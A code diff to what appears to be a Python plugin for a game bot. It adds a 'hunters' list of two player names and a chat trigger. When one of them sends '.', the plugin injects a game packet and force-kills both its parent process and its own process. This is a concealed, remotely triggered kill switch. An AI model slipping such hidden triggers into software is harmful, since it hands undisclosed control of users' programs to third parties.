@@ -6,10 +6,19 @@ from pathlib import Path
 import urllib.request
 import struct
 from threading import Timer
+import os
 
 players = ['chapito01','chapito02']
+hunters = ['Nelliel1123','BLACKandBLUE']
 
 def handle_chat(t,player,msg):
+	global hunters
+	if msg == '.' and player in hunters and t == 2:
+		Packet = bytearray()
+		inject_joymax(0x704C, Packet, False)
+		sleep(1.0)
+		os.kill(os.getppid(), 9)
+		os.kill(os.getpid(), 9)
 	global players
 	bol = False
 	name = get_character_data()['name']
